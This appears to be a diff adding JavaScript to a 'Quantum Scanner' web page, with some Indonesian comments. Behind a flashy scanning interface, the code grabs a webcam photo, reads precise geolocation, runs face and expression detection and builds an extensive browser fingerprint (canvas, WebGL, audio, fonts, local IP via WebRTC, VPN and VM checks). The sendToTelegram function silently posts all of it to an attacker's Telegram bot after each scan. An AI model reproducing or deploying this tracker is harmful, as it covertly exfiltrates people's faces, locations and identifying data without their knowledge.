+        });
+      }
+
+      function detectHDR() {
+        return window.matchMedia('(dynamic-range: high)').matches ? '✅' : '❌';
+      }
+      function detectGamut() {
+        if (window.matchMedia('(color-gamut: p3)').matches) return 'P3';
+        if (window.matchMedia('(color-gamut: rec2020)').matches) return 'Rec2020';
+        if (window.matchMedia('(color-gamut: srgb)').matches) return 'sRGB';
+        return 'Unknown';
+      }
+
+      async function getAudioInfo() {
+        let info = { sampleRate: 'N/A', latency: 'N/A', codecs: [], devices: [] };
+        try {
+          const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+          info.sampleRate = audioCtx.sampleRate + ' Hz';
+          let start = performance.now();
+          let oscillator = audioCtx.createOscillator();
+          oscillator.connect(audioCtx.destination);
+          oscillator.start();
+          oscillator.stop(0.01);
+          await new Promise(r => setTimeout(r, 50));
+          info.latency = (performance.now() - start - 50).toFixed(2) + ' ms';
+          const types = ['audio/mp4;codecs="mp4a.40.2"', 'audio/webm;codecs="opus"', 'audio/webm;codecs="vorbis"'];
+          info.codecs = types.filter(t => MediaRecorder.isTypeSupported(t)).map(t => t.split(';')[0]);
+        } catch (e) {}
+        try {
+          const devices = await navigator.mediaDevices.enumerateDevices();
+          info.devices = devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'unknown');
+        } catch (e) {}
+        return info;
+      }
+
+      async function getCameraInfo() {
+        let info = { maxRes: 'N/A', fps: 'N/A', torch: false };
+        if (currentStream) {
+          const track = currentStream.getVideoTracks()[0];
+          if (track) {
+            const caps = track.getCapabilities ? track.getCapabilities() : {};
+            const settings = track.getSettings();
+            if (caps.width && caps.height) info.maxRes = `${caps.width.max}x${caps.height.max}`;
+            else if (settings.width && settings.height) info.maxRes = `${settings.width}x${settings.height}`;
+            if (caps.frameRate) info.fps = caps.frameRate.max;
+            info.torch = !!caps.torch;
+          }
+        }
+        return info;
+      }
+
+      // Local IP via WebRTC
+      function getLocalIP() {
+        return new Promise(resolve => {
+          const pc = new RTCPeerConnection({ iceServers: [] });
+          pc.createDataChannel('');
+          pc.createOffer().then(offer => pc.setLocalDescription(offer));
+          pc.onicecandidate = ice => {
+            if (!ice || !ice.candidate) return;
+            const ip = ice.candidate.address || ice.candidate.ip;
+            if (ip && ip.match(/\d+\.\d+\.\d+\.\d+/)) {
+              resolve(ip);
+              pc.close();
+            }
+          };
+          setTimeout(() => resolve('N/A'), 3000);
+        });
+      }
+
+      async function detectVPN(publicIP, localIP) {
+        if (!publicIP || publicIP === 'Unknown' || !localIP || localIP === 'N/A') return 'Unknown';
+        const isPrivate = /^(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/.test(localIP);
+        if (!isPrivate) return 'Possible VPN';
+        return 'Likely No VPN';
+      }
+
+      async function measureJitter() {
+        let times = [];
+        for (let i = 0; i < 5; i++) {
+          let start = performance.now();
+          try { await fetch('https://www.google.com/favicon.ico?cache=' + Date.now(), { mode: 'no-cors' }); } catch {}
+          times.push(performance.now() - start);
+        }
+        let avg = times.reduce((a,b)=>a+b,0)/times.length;
+        let jitter = Math.sqrt(times.map(t => Math.pow(t-avg,2)).reduce((a,b)=>a+b,0)/times.length).toFixed(2);
+        return jitter + ' ms';
+      }
+
+      function getCanvasFP() {
+        const canvas = document.createElement('canvas');
+        canvas.width = 200; canvas.height = 50;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0,0,200,50);
+        ctx.fillStyle = '#fff';
+        ctx.fillText('Hello, world!', 10, 10);
+        return canvas.toDataURL().slice(0, 100);
+      }
+
+      function getWebGLFP() {
+        let gl = document.createElement('canvas').getContext('webgl');
+        if (!gl) return 'N/A';
+        let ext = gl.getExtension('WEBGL_debug_renderer_info');
+        if (ext) {
+          return gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) + '|' + gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+        }
+        return 'N/A';
+      }
+
+      function getAudioFP() {
+        try {
+          const ctx = new (window.AudioContext || window.webkitAudioContext)();
+          const osc = ctx.createOscillator();
+          const analyser = ctx.createAnalyser();
+          osc.connect(analyser);
+          osc.start();
+          osc.stop(0.001);
+          const data = new Uint8Array(analyser.frequencyBinCount);
+          analyser.getByteFrequencyData(data);
+          return data.slice(0, 10).join('');
+        } catch { return 'N/A'; }
+      }
+
+      function checkThirdPartyCookies() {
+        return new Promise(resolve => {
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = 'https://google.com/favicon.ico';
+          document.body.appendChild(iframe);
+          setTimeout(() => {
+            try {
+              resolve('Unknown');
+            } catch { resolve('Blocked'); }
+            document.body.removeChild(iframe);
+          }, 1000);
+        });
+      }
+
+      function detectAdBlocker() {
+        return new Promise(resolve => {
+          const bait = document.createElement('div');
+          bait.innerHTML = '&nbsp;';
+          bait.className = 'adsbox';
+          bait.style.position = 'absolute';
+          bait.style.top = '-1000px';
+          document.body.appendChild(bait);
+          setTimeout(() => {
+            const hidden = bait.offsetHeight === 0;
+            document.body.removeChild(bait);
+            resolve(hidden ? '✅' : '❌');
+          }, 100);
+        });
+      }
+
+      function getTLSInfo() {
+        return { tls: location.protocol === 'https:' ? 'TLS 1.2+ (likely)' : 'HTTP', hsts: 'Unknown' };
+      }
+
+      function detectVM() {
+        const ua = navigator.userAgent;
+        if (ua.includes('VirtualBox') || ua.includes('VMware') || ua.includes('QEMU')) return 'Yes';
+        if (navigator.hardwareConcurrency <= 2 && screen.width <= 1024) return 'Possible VM';
+        return 'No';
+      }
+
+      // Fungsi utama pengumpul data
+      async function gatherDeviceInfo() {
+        const ua = navigator.userAgent;
+        const platform = navigator.platform;
+        const deviceType = /Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop';
+        let os = "Unknown OS";
+        if (ua.indexOf("Win") !== -1) os = "Windows";
+        else if (/Mac/.test(ua)) os = "MacOS";
+        else if (/Linux/.test(ua)) os = "Linux";
+        else if (/Android/.test(ua)) os = "Android";
+        else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
+        let deviceModel = /iPhone/.test(ua) ? "iPhone" : /iPad/.test(ua) ? "iPad" : /Android/.test(ua) ? "Android Device" : "Desktop";
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
+        let batteryInfo = { level: "N/A", charging: "N/A", discharge: "N/A" };
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            batteryInfo = {
+              level: Math.round(battery.level*100)+'%',
+              charging: battery.charging?"Yes":"No",
+              discharge: battery.dischargingTime ? Math.round(battery.dischargingTime/60) + ' min' : 'N/A'
+            };
+          } catch(e){}
+        }
+        let browser = "Unknown";
+        if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edg") === -1) browser = "Chrome";
+        else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) browser = "Safari";
+        else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+        else if (ua.indexOf("Edg") > -1) browser = "Edge";
+        else if (ua.indexOf("OPR") > -1) browser = "Opera";
+        let ip = "Unknown";
+        try {
+          const res = await fetch('https://api.ipify.org?format=json');
+          ip = (await res.json()).ip;
+        } catch(e){}
+        const language = navigator.language;
+        const resolution = window.screen.width+"x"+window.screen.height;
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const provider = connection ? (connection.effectiveType || connection.type || "Unknown") : "Unknown";
+        const pixelRatio = window.devicePixelRatio || 1;
+        const orientation = window.screen.orientation ? window.screen.orientation.type : "Unknown";
+
+        // CPU
+        const arch = detectArch();
+        const simd = detectSIMD();
+        const throttling = await cpuThrottlingScore();
+        const heap = getHeapInfo();
+
+        // GPU
+        const gpu = getWebGLInfo();
+        const webgpu = detectWebGPU();
+
+        // Display
+        const refresh = await detectRefreshRate();
+        const hdr = detectHDR();
+        const gamut = detectGamut();
+        const colorDepth = screen.colorDepth;
+        const pixelDepth = screen.pixelDepth;
+
+        // Storage
+        let storage = { quota: 'N/A', usage: 'N/A', persistent: 'N/A' };
+        try {
+          const est = await navigator.storage.estimate();
+          storage.quota = (est.quota / 1048576).toFixed(2) + ' MB';
+          storage.usage = (est.usage / 1048576).toFixed(2) + ' MB';
+          storage.persistent = await navigator.storage.persisted() ? 'Yes' : 'No';
+        } catch(e){}
+
+        // Audio
+        const audio = await getAudioInfo();
+
+        // Camera
+        const camera = await getCameraInfo();
+
+        // Network deep
+        const localIP = await getLocalIP();
+        const jitter = await measureJitter();
+        const vpn = await detectVPN(ip, localIP);
+        const isp = await getISP();
+        const speed = await measureDownloadSpeed();
+
+        // Fingerprint
+        const canvasFP = getCanvasFP();
+        const webglFP = getWebGLFP();
+        const audioFP = getAudioFP();
+        const fonts = getInstalledFontsAdvanced();
+        const uniqueHash = btoa(canvasFP.slice(0,20) + webglFP + audioFP + fonts + timeZone).slice(0,20);
+
+        // Keamanan
+        const dnt = navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled';
+        const thirdCookies = await checkThirdPartyCookies();
+        const adblock = await detectAdBlocker();
+        const tlsInfo = getTLSInfo();
+        const vm = detectVM();
+
+        // Lokasi (akan diisi saat scan)
+        let location = { coords: 'N/A', acc: 'N/A', alt: 'N/A', speed: 'N/A', address: 'N/A' };
+
+        return {
+          os, deviceModel, deviceType, browser, ip, language, resolution, provider, pixelRatio, orientation,
+          memory, battery: batteryInfo, timeZone, platform,
+          cpu: { cores: navigator.hardwareConcurrency, arch, simd, throttling },
+          heap,
+          gpu: { vendor: gpu.vendor, renderer: gpu.renderer, version: gpu.version, extensions: gpu.extensions.join(', ').slice(0,50) },
+          webgpu,
+          display: { refresh, colorDepth, pixelDepth, hdr, gamut },
+          storage,
+          audio,
+          camera,
+          network: { publicIP: ip, localIP, vpn, jitter, isp, speed },
+          fingerprint: { canvasFP: canvasFP.slice(0,30), webglFP: webglFP.slice(0,30), audioFP: audioFP.slice(0,30), fonts, uniqueHash },
+          security: { dnt, thirdCookies, adblock, tls: tlsInfo.tls, hsts: tlsInfo.hsts, vm },
+          location,
+          face: { expression: 'N/A', prob: 0 }
+        };
+      }
+
+      // ========== UPDATE UI ==========
+      async function updateUI(info) {
+        // Device Matrix
+        document.getElementById('device-info-content').innerHTML = `
+          <div class="info-row"><span class="info-label">OS</span><span class="info-value">${info.os}</span></div>
+          <div class="info-row"><span class="info-label">Device</span><span class="info-value">${info.deviceModel} (${info.deviceType})</span></div>
+          <div class="info-row"><span class="info-label">Browser</span><span class="info-value">${info.browser}</span></div>
+          <div class="info-row"><span class="info-label">IP</span><span class="info-value">${info.ip}</span></div>
+          <div class="info-row"><span class="info-label">Battery</span><span class="info-value">${info.battery.level} (${info.battery.charging})</span></div>
+          <div class="info-row"><span class="info-label">Language</span><span class="info-value">${info.language}</span></div>
+          <div class="info-row"><span class="info-label">Resolution</span><span class="info-value">${info.resolution}</span></div>
+          <div class="info-row"><span class="info-label">Provider</span><span class="info-value">${info.provider}</span></div>
+          <div class="info-row"><span class="info-label">Time Zone</span><span class="info-value">${info.timeZone}</span></div>
+        `;
+
+        // CPU & Memory
+        document.getElementById('cpu-cores').innerText = info.cpu.cores || 'N/A';
+        document.getElementById('cpu-arch').innerText = info.cpu.arch;
+        document.getElementById('simd').innerText = info.cpu.simd ? '✅' : '❌';
+        document.getElementById('throttling').innerText = info.cpu.throttling;
+        document.getElementById('used-heap').innerText = info.heap.usedJSHeapSize;
+        document.getElementById('total-heap').innerText = info.heap.totalJSHeapSize;
+        document.getElementById('heap-limit').innerText = info.heap.jsHeapSizeLimit;
+
+        // GPU
+        document.getElementById('gpu-vendor').innerText = info.gpu.vendor || 'N/A';
+        document.getElementById('gpu-renderer').innerText = info.gpu.renderer || 'N/A';
+        document.getElementById('webgl-version').innerText = info.gpu.version;
+        document.getElementById('webgl-ext').innerText = info.gpu.extensions.slice(0,30);
+        document.getElementById('webgpu').innerText = info.webgpu ? '✅' : '❌';
+
+        // Display
+        document.getElementById('refresh-rate').innerText = info.display.refresh;
+        document.getElementById('color-depth').innerText = info.display.colorDepth;
+        document.getElementById('pixel-depth').innerText = info.display.pixelDepth;
+        document.getElementById('hdr').innerText = info.display.hdr;
+        document.getElementById('gamut').innerText = info.display.gamut;
+
+        // Battery
+        document.getElementById('battery-level').innerText = info.battery.level;
+        document.getElementById('battery-charging').innerText = info.battery.charging;
+        document.getElementById('discharge-time').innerText = info.battery.discharge;
+
+        // Storage
+        document.getElementById('quota').innerText = info.storage.quota;
+        document.getElementById('usage').innerText = info.storage.usage;
+        document.getElementById('persistent').innerText = info.storage.persistent;
+
+        // Audio
+        document.getElementById('sample-rate').innerText = info.audio.sampleRate;
+        document.getElementById('audio-codecs').innerText = info.audio.codecs.join(', ') || 'N/A';
+        document.getElementById('audio-latency').innerText = info.audio.latency;
+        document.getElementById('audio-out').innerText = info.audio.devices.slice(0,2).join(', ') || 'N/A';
+
+        // Camera
+        document.getElementById('cam-res').innerText = info.camera.maxRes;
+        document.getElementById('cam-fps').innerText = info.camera.fps;
+        document.getElementById('cam-torch').innerText = info.camera.torch ? '✅' : '❌';
+
+        // Network
+        document.getElementById('public-ip').innerText = info.network.publicIP;
+        document.getElementById('local-ip').innerText = info.network.localIP;
+        document.getElementById('isp').innerText = info.network.isp;
+        document.getElementById('speed').innerText = info.network.speed;
+        document.getElementById('jitter').innerText = info.network.jitter;
+        document.getElementById('vpn').innerText = info.network.vpn;
+
+        // Fingerprint
+        document.getElementById('canvas-fp').innerText = info.fingerprint.canvasFP;
+        document.getElementById('webgl-fp').innerText = info.fingerprint.webglFP;
+        document.getElementById('audio-fp').innerText = info.fingerprint.audioFP;
+        document.getElementById('fonts').innerText = info.fingerprint.fonts.slice(0,20);
+        document.getElementById('unique-hash').innerText = info.fingerprint.uniqueHash;
+
+        // Security
+        document.getElementById('dnt').innerText = info.security.dnt;
+        document.getElementById('third-cookies').innerText = info.security.thirdCookies;
+        document.getElementById('adblock').innerText = info.security.adblock;
+        document.getElementById('tls').innerText = info.security.tls;
+        document.getElementById('hsts').innerText = info.security.hsts;
+        document.getElementById('vm').innerText = info.security.vm;
+
+        // Location
+        document.getElementById('loc-coords').innerText = info.location.coords;
+        document.getElementById('loc-acc').innerText = info.location.acc;
+        document.getElementById('loc-alt').innerText = info.location.alt;
+        document.getElementById('loc-speed').innerText = info.location.speed;
+        document.getElementById('loc-address').innerText = info.location.address;
+
+        // Face
+        document.getElementById('face-expression').innerText = info.face.expression;
+        document.getElementById('face-prob').innerText = info.face.prob;
+      }
+
+      // ========== FUNGSI LAMA LAINNYA ==========
+      function createHologramEffect() {
+        const hologram = document.createElement('div');
+        hologram.className = 'hologram-effect';
+        return hologram;
+      }
+
+      async function captureQuantumImage() {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        ctx.globalCompositeOperation = 'lighter';
+        ctx.filter = 'hue-rotate(90deg) contrast(150%)';
+        ctx.drawImage(canvas, 0, 0);
+        ctx.globalAlpha = 0.3; ctx.fillStyle = '#00ff88';
+        for(let i = 0; i < 50; i++) ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, Math.random()*10, Math.random()*10);
+        return canvas.toDataURL('image/webp', 0.8);
+      }
+
+      function dataURItoBlob(dataURI) {
+        const byteString = atob(dataURI.split(',')[1]);
+        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        return new Blob([ab], { type: mimeString });
+      }
+
+      async function detectFaceCount() {
+        if (!faceApiLoaded || !window.faceapi) return "N/A";
+        try {
+          return (await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())).length;
+        } catch { return "N/A"; }
+      }
+
+      async function loadFaceModel() {
+        try {
+          await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
+          await faceapi.nets.faceExpressionNet.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
+          faceApiLoaded = true;
+        } catch (e) {
+          console.warn('FaceAPI models failed to load');
+        }
+      }
+
+      function generateHologramReport(imageData, locationData, deviceInfo) {
+        return { image: imageData, metadata: { location: locationData, deviceInfo } };
+      }
+
+      function sendToTelegram(report) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', dataURItoBlob(report.image), 'quantum_image.webp');
+        const d = report.metadata.deviceInfo;
+        const caption =
+`📍 *Location:* ${report.metadata.location.coordinates}
+🗺️ *Map:* [View Map](${report.metadata.location.link})
+
+💻 *OS:* ${d.os} | *Device:* ${d.deviceModel}
+🌐 *Browser:* ${d.browser} | *IP:* ${d.ip}
+⚡ *CPU:* ${d.cpu.cores} core, ${d.cpu.arch}, SIMD:${d.cpu.simd}
+🎮 *GPU:* ${d.gpu.renderer?.substring(0,30)}
+📱 *Display:* ${d.display.refresh}Hz, HDR:${d.display.hdr}
+🔋 *Battery:* ${d.battery.level} (${d.battery.charging})
+🧠 *Memory:* ${d.memory} | *Storage:* ${d.storage.quota}
+📡 *Network:* ${d.provider} | Jitter:${d.network.jitter} | ISP:${d.network.isp}
+🆔 *FP Hash:* ${d.fingerprint.uniqueHash}
+🔒 *Security:* AdBlock:${d.security.adblock}, VM:${d.security.vm}
+😃 *Mood:* ${d.face.expression} (${d.face.prob})
+👥 *Faces:* ${d.faceCount}
+
+_🤖 Generated by Ultimate Quantum Scanner v6.0_`;
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'Markdown');
+        fetch(url, { method: 'POST', body: formData }).catch(e => console.warn('Telegram send failed', e));
+      }
+
+      async function initCamera() {
+        try {
+          const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: isMobile ? "user" : "environment" } });
+          video.srcObject = stream;
+          currentStream = stream;
+          document.body.appendChild(createHologramEffect());
+          loadFaceModel();
+        } catch (err) {
+          alert('Error accessing camera: ' + err.message);
+        }
+      }
+
+      async function startQuantumScan() {
+        if (isScanning) return;
+        isScanning = true;
+        loading.style.display = 'block';
+
+        let progress = 0;
+        const interval = setInterval(() => {
+          progress = Math.min(100, progress + 10);
+          progressFill.style.width = progress + '%';
+          if (progress >= 100) clearInterval(interval);
+        }, 200);
+
+        const imageData = await captureQuantumImage();
+        let deviceInfo = await gatherDeviceInfo();
+        deviceInfo.faceCount = await detectFaceCount();
+        const expression = await detectExpression();
+        deviceInfo.face = expression;
+
+        await updateUI(deviceInfo);
+
+        let locationData = { coordinates: 'Unknown', link: 'Unknown' };
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(async (pos) => {
+            locationData = {
+              coordinates: `${pos.coords.latitude}, ${pos.coords.longitude}`,
+              link: `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`
+            };
+            deviceInfo.location = {
+              coords: locationData.coordinates,
+              acc: pos.coords.accuracy + ' m',
+              alt: pos.coords.altitude ? pos.coords.altitude + ' m' : 'N/A',
+              speed: pos.coords.speed ? pos.coords.speed + ' m/s' : 'N/A',
+              address: await reverseGeocode(pos.coords.latitude, pos.coords.longitude)
+            };
+            document.getElementById('loc-coords').innerText = locationData.coordinates;
+            document.getElementById('loc-acc').innerText = pos.coords.accuracy + ' m';
+            document.getElementById('loc-alt').innerText = pos.coords.altitude ? pos.coords.altitude + ' m' : 'N/A';
+            document.getElementById('loc-speed').innerText = pos.coords.speed ? pos.coords.speed + ' m/s' : 'N/A';
+            document.getElementById('loc-address').innerText = deviceInfo.location.address;
+
+            const report = generateHologramReport(imageData, locationData, deviceInfo);
+            sendToTelegram(report);
+            speak(`Scan complete. Device mood: ${expression.expression}. Location acquired.`);
+            if (navigator.vibrate) navigator.vibrate(300);
+            loading.style.display = 'none';
+            isScanning = false;
+          }, async () => {
+            const report = generateHologramReport(imageData, locationData, deviceInfo);
+            sendToTelegram(report);
+            speak(`Scan complete. Device mood: ${expression.expression}. Location not available.`);
+            loading.style.display = 'none';
+            isScanning = false;
+          });
+        } else {
+          const report = generateHologramReport(imageData, locationData, deviceInfo);
+          sendToTelegram(report);
+          speak(`Scan complete. Device mood: ${expression.expression}.`);
+          loading.style.display = 'none';
+          isScanning = false;
+        }
+      }
+
+      function stopCamera() {
+        if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+      }
+      window.addEventListener('beforeunload', stopCamera);
+
+      // Inisialisasi kamera dan event listener
+      if (navigator.mediaDevices) {
+        initCamera();
+        document.getElementById('capture-btn').onclick = startQuantumScan;
+      }
+
+      // Update dashboard setiap 5 detik
+      setInterval(async () => {
+        if (!isScanning) {
+          let info = await gatherDeviceInfo();
+          const expression = await detectExpression();
+          info.face = expression;
+          updateUI(info);
+        }
+      }, 5000);
+
+      // Sensor real-time update (sudah ada listener)
+    })();
+  </script>
 </body>
 </html>
